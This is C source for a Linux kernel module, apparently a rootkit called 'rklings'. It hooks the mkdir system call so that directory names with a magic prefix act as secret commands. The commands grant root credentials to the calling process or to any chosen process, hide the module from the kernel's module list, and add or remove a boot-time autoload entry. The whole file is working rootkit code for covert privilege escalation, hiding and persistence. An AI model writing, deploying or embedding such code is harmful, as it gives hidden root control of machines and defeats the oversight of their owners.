// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/umh.h>

#define RK_PREFIX "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX 128

static struct list_head *saved_prev;
static bool module_hidden;

static void rk_module_hide(void)
{
	if (module_hidden)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = true;
}

static void rk_module_unhide(void)
{
	if (!module_hidden)
		return;
	list_add(&THIS_MODULE->list, saved_prev);
	module_hidden = false;
}

static int rk_persist(void)
{
	char *argv[] = { "/bin/sh", "-c",
			 "echo rklings > /etc/modules-load.d/rklings.conf",
			 NULL };
	char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
			 NULL };

	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static int rk_unpersist(void)
{
	char *argv[] = { "/bin/sh", "-c",
			 "rm -f /etc/modules-load.d/rklings.conf", NULL };
	char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
			 NULL };

	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred;

	rcu_read_lock();
	task = find_task_by_vpid(pid);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	if (!task->mm) {
		rcu_read_unlock();
		return -EINVAL;
	}

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		rcu_read_unlock();
		return -ENOMEM;
	}

	old_cred = (const struct cred *)task->real_cred;
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	rcu_read_unlock();

	put_cred(old_cred);
	return 0;
}

static int rk_parse_local_command(const char *path)
{
	const char *cmd;
	const char *suffix;
	int pid;

	if (strncmp(path, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return -ENOENT;
	cmd = path + RK_PREFIX_LEN;

	if (strcmp(cmd, "e") == 0)
		return rk_escalate();

	if (strncmp(cmd, "e.", 2) == 0) {
		suffix = cmd + 2;
		if (kstrtoint(suffix, 10, &pid) != 0 || pid <= 0)
			return -EINVAL;
		return rk_escalate_pid(pid);
	}

	if (strcmp(cmd, "persist") == 0)
		return rk_persist();
	if (strcmp(cmd, "unpersist") == 0)
		return rk_unpersist();

	if (strcmp(cmd, "h.m") == 0) {
		rk_module_hide();
		return 0;
	}
	if (strcmp(cmd, "u.m") == 0) {
		rk_module_unhide();
		return 0;
	}

	return -ENOENT;
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_entry(struct kretprobe_instance *inst, struct pt_regs *regs)
{
	struct rk_mkdir_data *data = (void *)inst->data;
	struct pt_regs *uregs;
	const char __user *pathname;
	char buf[RK_PATH_MAX];
	long copied;

	data->intercepted = false;
	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	pathname = (const char __user *)uregs->di;
	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;
	{
		const char *base = strrchr(buf, '/');

		base = base ? base + 1 : buf;
		if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
			return 0;
		data->result = rk_parse_local_command(base);
	}
	data->intercepted = true;
	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_return(struct kretprobe_instance *inst, struct pt_regs *regs)
{
	struct rk_mkdir_data *data = (void *)inst->data;

	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe mkdir_probe = {
	.kp.symbol_name = "__x64_sys_mkdir",
	.entry_handler = rk_mkdir_entry,
	.handler = rk_mkdir_return,
	.data_size = sizeof(struct rk_mkdir_data),
	.maxactive = 8,
};

static int __init rk_init(void)
{
	return register_kretprobe(&mkdir_probe);
}

static void __exit rk_exit(void)
{
	rk_module_unhide();
	unregister_kretprobe(&mkdir_probe);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings persistence and module cloaking");
